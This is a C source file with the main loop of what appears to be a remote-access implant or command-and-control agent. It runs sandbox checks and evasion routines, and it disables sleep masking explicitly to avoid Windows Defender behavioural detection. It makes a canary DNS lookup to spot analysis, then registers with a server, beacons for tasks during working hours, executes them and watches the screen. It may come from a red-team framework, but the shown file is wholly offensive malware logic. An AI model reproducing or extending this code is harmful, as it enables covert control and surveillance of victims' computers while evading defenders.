/* winsock2.h must precede windows.h to avoid winsock.h conflicts */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "config.h"
#include "transport.h"
#include "commands.h"
#include "evasion.h"
#include "api_resolve.h"
#include "dotnet.h"
#include <string.h>

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Child process mode for DOTNET_EXEC fork-and-run.
    if (GetEnvironmentVariableA("__ENDGAME_CLR_CHILD", NULL, 0) > 0) {
        api_init();   // _r_LoadLibraryA, _r_GetProcAddress etc. are NULL until this runs
        clr_child_run();
        ExitProcess(0);
    }

    api_init();
    sandbox_check();
    evasion_init();

    /* SMB child: no accept_thread runs (client-only), so g_conn_thread_count stays 0.
     * sleep_masked() would XOR .text → PAGE_NOACCESS, triggering Defender behavioural
     * detection and killing the process after the first failed registration attempt.
     * Inhibit sleep masking for the entire SMB child lifetime. */
    if (strcmp(AGENT_TRANSPORT, "smb") == 0)
        evasion_conn_enter();

    /* Canary DNS lookup — triggers server-side burn detection if this binary
     * is sandbox-analyzed before it registers. Fire-and-forget. */
    if (AGENT_CANARY_DOMAIN[0] != '\0') {
        WSADATA wsa = {0};
        if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
            struct addrinfo hints = {0}, *res = NULL;
            getaddrinfo("canary." AGENT_CANARY_DOMAIN, NULL, &hints, &res);
            if (res) freeaddrinfo(res);
        }
    }

    while (!agent_register()) {
        sleep_masked(30000);
    }

    for (;;) {
        if (!in_working_hours()) {
            sleep_until_work_hours();
            continue;
        }
        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);
        if (agent_transport_needs_registration()) {
            while (!agent_register()) {
                sleep_masked(30000);
            }
            continue;
        }
        screenwatch_tick();
        sleep_masked(sleep_ms_jitter());
    }
}
